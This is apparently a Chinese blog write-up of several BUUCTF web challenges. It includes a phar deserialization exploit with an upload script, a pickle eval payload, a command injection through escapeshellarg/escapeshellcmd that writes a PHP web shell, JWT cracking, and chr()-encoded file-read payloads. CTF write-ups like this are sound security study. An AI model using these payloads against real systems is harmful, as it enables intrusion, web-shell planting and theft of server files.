class="hljs-keyword">function</span> (<span class="hljs-params">json</span>) </span>{</span><br><span class="line">            <span class="hljs-keyword">if</span> (json[<span class="hljs-string">'success'</span>]) {</span><br><span class="line">                toast(<span class="hljs-string">'删除成功'</span>, <span class="hljs-string">'info'</span>);</span><br><span class="line">            } <span class="hljs-keyword">else</span> {</span><br><span class="line">                toast(json[<span class="hljs-string">'error'</span>], <span class="hljs-string">'danger'</span>);</span><br><span class="line">            }</span><br><span class="line">            setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>{location.reload();}, <span class="hljs-number">1000</span>);</span><br><span class="line">        }</span><br><span class="line">    });</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>试试能不能任意文件下载, 证明是可以的, 不过需要用绝对路径, 默认的路径不在html下面</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200213195802.png" alt></p>
<p>然后就是审计了, 可以看到有个神奇的<code>close()</code></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200213200008.png" alt></p>
<p>这个应该就是获取flag的地方了, 那找一下调用的部分</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200213200124.png" alt></p>
<p>这里有个调用点, 结合文件上传, 应该是phar反序列化, 那是不是直接用</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User -> __destruct() -> File -> close()</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>这条调用链呢, 答案是不行的, 如果这样的话是可以实现读取, 但是不能够输出, 所以需要借助第三个类</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200213200345.png" alt></p>
<p>这个类有两个主要的方法</p>
<ul>
<li><code>__call()</code>: 用于实现函数调用, 对于自身没有的函数会调用<code>$file->$func()</code></li>
<li><code>__destruct()</code>: 用于输出</li>
</ul>
<p>那么调用链就可以实现了</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User -> __destruct() -> Filelist -> close()[不存在] -> __call() -> File -> close()</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>然后使用phar生成的exp如下</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $filename;</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($filename)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>->filename = $filename;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $db;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> $files;</span><br><span class="line">    <span class="hljs-keyword">private</span> $results;</span><br><span class="line">    <span class="hljs-keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        $file = <span class="hljs-keyword">new</span> File(<span class="hljs-string">"/flag.txt"</span>);</span><br><span class="line">        <span class="hljs-keyword">$this</span>->files = <span class="hljs-keyword">array</span>($file);</span><br><span class="line">        <span class="hljs-keyword">$this</span>->results = <span class="hljs-keyword">array</span>();</span><br><span class="line">        <span class="hljs-keyword">$this</span>->funcs = <span class="hljs-keyword">array</span>();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">$user = <span class="hljs-keyword">new</span> User();</span><br><span class="line">$user->db = <span class="hljs-keyword">new</span> FileList();</span><br><span class="line">$filename = <span class="hljs-string">"dropbox.phar"</span>;</span><br><span class="line">file_exists($filename) ? unlink($filename) : <span class="hljs-keyword">null</span>;</span><br><span class="line">$phar=<span class="hljs-keyword">new</span> Phar($filename);</span><br><span class="line">$phar->startBuffering();</span><br><span class="line">$phar->setStub(<span class="hljs-string">"GIF89a<?php __HALT_COMPILER(); ?>"</span>);</span><br><span class="line">$phar->setMetadata($user);</span><br><span class="line">$phar->addFromString(<span class="hljs-string">"foo.txt"</span>,<span class="hljs-string">"bar"</span>);</span><br><span class="line">$phar->stopBuffering();</span><br><span class="line"><span class="hljs-meta">?></span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>随手写了个py脚本进行自动化上传</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">"http://dad30c9a-7a47-42a6-a844-5dd18599a35b.node3.buuoj.cn/"</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    command = <span class="hljs-string">"php ./exp.php"</span></span><br><span class="line">    os.system(command)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    data = {</span><br><span class="line">        <span class="hljs-string">"username"</span>: <span class="hljs-string">"cjm00n"</span>,</span><br><span class="line">        <span class="hljs-string">"password"</span>: <span class="hljs-string">"cjm00n"</span></span><br><span class="line">    }</span><br><span class="line">    session.post(url + <span class="hljs-string">"login.php"</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    file = open(<span class="hljs-string">"dropbox.phar"</span>, <span class="hljs-string">"rb"</span>)</span><br><span class="line">    files = {</span><br><span class="line">        <span class="hljs-string">'file'</span>: (<span class="hljs-string">'dropbox.gif'</span>, file, <span class="hljs-string">"image/gif"</span>)</span><br><span class="line">    }</span><br><span class="line">    session.post(url + <span class="hljs-string">"upload.php"</span>, files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    res = session.post(url + <span class="hljs-string">"delete.php"</span>,</span><br><span class="line">                       data={<span class="hljs-string">"filename"</span>: <span class="hljs-string">"phar://dropbox.gif"</span>}).text</span><br><span class="line">    <span class="hljs-comment"># get flag</span></span><br><span class="line">    print(re.findall(<span class="hljs-string">"flag{.+}"</span>, res)[<span class="hljs-number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    generate()</span><br><span class="line">    login()</span><br><span class="line">    upload()</span><br><span class="line">    delete()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>这题蛮有意思的</p>
<p>首先看一下页面</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200213222629.png" alt></p>
<p>发现有个提示, 翻了几页没有看到lv6的, 测了一下发现页数还是挺多的, 可以到200</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200213222733.png" alt></p>
<p>写个脚本跑一下</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">"http://8d13affc-8a20-4111-a664-73e47683080d.node3.buuoj.cn/shop?page="</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">200</span>):</span><br><span class="line">    res = requests.get(url + str(i)).text</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-string">"lv6.png"</span> <span class="hljs-keyword">in</span> res:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="hljs-keyword">break</span></span><br><span class="line">    sleep(<span class="hljs-number">0.1</span>)</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>结果在<code>181</code>页, 但是价格巨大, 在post参数中发现有<code>price</code>和<code>discount</code>, 改一个很小(大?)的折扣</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200213222957.png" alt></p>
<p>然后就可以顺利买到了, 然后提示一个新的页面<code>b1g_m4mber</code></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200213223159.png" alt></p>
<p>这里不是<code>XFF</code>那些操作, 而是通过改jwt参数来伪造, 有点像前面的<code>[HCTF 2018]admin</code></p>
<p>在 <a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a> 查询一下当前的jwt</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200213223347.png" alt></p>
<p>但是改jwt前需要获取<code>key</code>, 使用 <a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a> 爆破一下</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200213223501.png" alt></p>
<p>顺利伪造</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200213223529.png" alt></p>
<p>在页面的注释找到了源码的位置</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200213223613.png" alt></p>
<p>审计, 发现有个<code>pickle反序列化</code></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200213223653.png" alt></p>
<p>参考 <a href="https://blog.csdn.net/qq_26406447/article/details/91964502" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/91964502</a>, </p>
<blockquote>
<p>当序列化以及反序列化的过程中中碰到一无所知的扩展类型( python2,这里指的就是新式类)的时候，可以通过类中定义的 <strong>reduce</strong> 方法来告知如何进行序列化或者反序列化也就是说我们，只要在新式类中定义一个<strong>reduce</strong> 方法，我们就能在序列化的使用让这个类根据我们在 <strong>reduce</strong> 中指定的方式进行序列化</p>
</blockquote>
<p>脚本如下</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> pickle</span><br><span class="line"><span class="hljs-keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">payload</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">       <span class="hljs-keyword">return</span> (eval, (<span class="hljs-string">"open('/flag.txt','r').read()"</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="hljs-keyword">print</span> a</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>先点击成为大会员的按钮</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200213223933.png" alt></p>
<p>然后将抓到的post包的<code>become</code>参数改为脚本的输出就可以了</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200213224007.png" alt></p>
<p>关于具体的<code>pickle</code>反序列化可以参考 <a href="https://daolgts.github.io/2019/09/20/python%20pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">python pickle反序列漏洞</a></p>
<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>主要参考 <a href="https://althims.com/2019/07/25/buu-online-tool-wp/" target="_blank" rel="noopener">https://althims.com/2019/07/25/buu-online-tool-wp/</a></p>
<p><a href="https://tiaonmmn.github.io/2019/09/08/BUUOJ刷题-Web-Online-Tool/" target="_blank" rel="noopener">https://tiaonmmn.github.io/2019/09/08/BUUOJ%E5%88%B7%E9%A2%98-Web-Online-Tool/</a></p>
<p>标准的RCE题目, 而且可以看到两个比较特别的函数</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200213230024.png" alt></p>
<p>分别查一下手册</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200213230042.png" alt></p>
<p>有意思的是这个中文居然还有儿化音hhh</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200213230129.png" alt></p>
<p>那么来分析一下, 直接用payload来做解释</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' <?php phpinfo();?> -oG shell.php</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>首先这个payload会经过<code>escapeshellarg</code>, 这个函数有以下三个步骤</p>
<ol>
<li><p>对单引号进行转义</p>
<p> </p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\' <?php phpinfo();?> -oG shell.php</span><br></pre></td></tr></tbody></table></figure><p></p>
</li>
<li><p>将转义的单引号用单引号包裹起来</p>
<p> </p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'\'' <?php phpinfo();?> -oG shell.php</span><br></pre></td></tr></tbody></table></figure><p></p>
</li>
<li><p>将整个语句用单引号包裹起来</p>
<p> </p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">''\'' <?php phpinfo();?> -oG shell.php '</span><br></pre></td></tr></tbody></table></figure><p></p>
<p> <img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200214000802.png" alt></p>
</li>
</ol>
<p>然后经过<code>escapeshellcmd</code>, 这个函数的步骤如下</p>
<ol>
<li><p>在以下字符前面加入转义符, 在win下所有这些字符以及 <em>%</em> 和 <em>!</em> 字符都会被空格代替, 不过实测发现是被<code>^</code>代替</p>
<p> </p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#;`|*?~<>^()[]{}$\, \x0A, \xFF</span><br></pre></td></tr></tbody></table></figure><p></p>
<p> <img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200214001529.png" alt></p>
 <center>linux</center>
![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200214001604.png)

</li>
</ol>
<center>win</center>

<ol start="2">
<li><p>匹配单引号数量(包括被<code>\</code>转义的), 如果是奇数则转义最后一个单引号, 如果是偶数则不转义</p>
<p> </p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">''\'' <?php phpinfo();?> -oG shell.php '</span><br></pre></td></tr></tbody></table></figure><p></p>
<p> 则会变成</p>
<p> </p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">''\'' <?php phpinfo();?> -oG shell.php \'</span><br></pre></td></tr></tbody></table></figure><p></p>
<p> 如果是</p>
<p> </p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">''\''' <?php phpinfo();?> -oG shell.php '</span><br></pre></td></tr></tbody></table></figure><p></p>
<p> 则不会转义</p>
<p> 当然在实际中, 语句的中间部分也会被转义, 结果如下</p>
<p> <img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200214002016.png" alt></p>
</li>
</ol>
<p>可以看到前面的<code>''\\''</code>已经闭合, 中间的部分则会写入到<code>shell.php</code>中, 而为了避免最后出现的单引号来影响文件名, 我们需要在payload的最后加一个<code></code>, 在url中需要写成<code>%20</code>, 不然会被浏览器自动忽略</p>
<p>最终payload如下</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">' <?php echo `cat /flag`;?> -oG shell.php </span><br><span class="line"># 或者</span><br><span class="line">' <?php echo `cat /flag`;?> -oG shell.php '</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>然后访问即可</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200214002316.png" alt></p>
<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><ul>
<li><code>MD5($password, true)</code></li>
</ul>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br><span class="line"># or</span><br><span class="line">129581926211651571912466741651878684928</span><br></pre></td></tr></tbody></table></figure><p></p>
<ul>
<li><code>===</code></li>
</ul>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>模板注入, 读了下源码</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($_SERVER[<span class="hljs-string">'HTTP_CLIENT_IP'</span>])) </span><br><span class="line">{</span><br><span class="line">    $ip=$_SERVER[<span class="hljs-string">'HTTP_CLIENT_IP'</span>];</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">elseif</span> (!<span class="hljs-keyword">empty</span>($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>]))</span><br><span class="line">{</span><br><span class="line">    $ip=$_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">else</span></span><br><span class="line">{</span><br><span class="line">    $ip=$_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>获取ip的方式如上, 我们只要随便选一个填写注入代码就可以了</p>
<p>我用的是<code>client-ip</code></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200214004701.png" alt></p>
<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>双写绕过</p>
<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>参考 <a href="https://shawroot.hatenablog.com/entry/2019/10/29/ASIS_2019-Unicorn_shop" target="_blank" rel="noopener">https://shawroot.hatenablog.com/entry/2019/10/29/ASIS_2019-Unicorn_shop</a></p>
<p>随便买个东西会发现报错</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200214122902.png" alt></p>
<p>这个有点迷惑, 查了下好像是环境的问题, 如果改动<code>price</code>会有另外一个错误</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200214122949.png" alt></p>
<p>提示我们需要用一个<code>char</code>来表示数字, 结合题目的<code>unicorn</code>, 应该指的是<code>unicode</code>, 可以在这个网址找到</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200214123111.png" alt></p>
<p>并且我们可以看到有些字符会有一个<code>Numeric Value</code>的值, 这就可以用来转换了, 像这样找到一个大于<code>1337</code>(最贵的item)的值就可以了</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200214123225.png" alt></p>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line">error_reporting(<span class="hljs-number">0</span>);</span><br><span class="line"><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'num'</span>])){</span><br><span class="line">    show_source(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">}<span class="hljs-keyword">else</span>{</span><br><span class="line">        $str = $_GET[<span class="hljs-string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="hljs-string">' '</span>, <span class="hljs-string">'\t'</span>, <span class="hljs-string">'\r'</span>, <span class="hljs-string">'\n'</span>,<span class="hljs-string">'\''</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">'`'</span>, <span class="hljs-string">'\['</span>, <span class="hljs-string">'\]'</span>,<span class="hljs-string">'\$'</span>,<span class="hljs-string">'\\'</span>,<span class="hljs-string">'\^'</span>];</span><br><span class="line">        <span class="hljs-keyword">foreach</span> ($blacklist <span class="hljs-keyword">as</span> $blackitem) {</span><br><span class="line">                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/'</span> . $blackitem . <span class="hljs-string">'/m'</span>, $str)) {</span><br><span class="line">                        <span class="hljs-keyword">die</span>(<span class="hljs-string">"what are you want to do?"</span>);</span><br><span class="line">                }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">eval</span>(<span class="hljs-string">'echo '</span>.$str.<span class="hljs-string">';'</span>);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">?></span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>源码很简单, 只需要将需要绕过的地方用<code>chr()</code>表示就可以了, 但是这里有个waf, 当时一直绕不过去, 看了wp才知道, 在php解析变量的时候, 会替换空白符, 也就是说在php中</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=1</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>和</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num=1</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>是一样的, 但是对于其他的语言并不一定, 所以可以通过这样的方法来绕过waf</p>
<p>那么payload如下</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;var_dump(scandir(chr(47))); // ls</span><br><span class="line">1;readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)); // /f1agg</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200214135351.png" alt></p>
<p><br></p><blockquote class="colorquote info"><p>本文作者: cjm00n<br>本文地址: <a href="https://cjm00n.top/2020/02/14/BuuCTF刷题记录/">https://cjm00n.top/2020/02/14/BuuCTF刷题记录/</a> <br>版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。</p>
</blockquote><p></p>
</body></html>
        
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
        
        <span class="column is-narrow"><a class="tag is-light article-tag"
                href="/tags/Writeup/">#Writeup</a></span>
        
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2020/02/14/BuuCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/">BuuCTF刷题记录2</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2019/11/24/HTB-Hack%E4%B9%8B%E6%97%85/">HTB-Hack之旅</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">Comments</h3>
    
<script>
    var disqus_config = function () {
        this.page.url = 'https://cjm00n.top/2020/02/14/BuuCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/';
        this.page.identifier = '2020/02/14/BuuCTF刷题记录/';
        
        this.language = 'en';
        
    };
    (function() {
        var d = document, s = d.createElement('script');  
        s.src = '//' + 'cjm00n' + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>

<div id="disqus_thread">
    
    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a></noscript>
</div>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                <i class="fas fa-moon"></i> 2020 cjM00N&nbsp;
                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
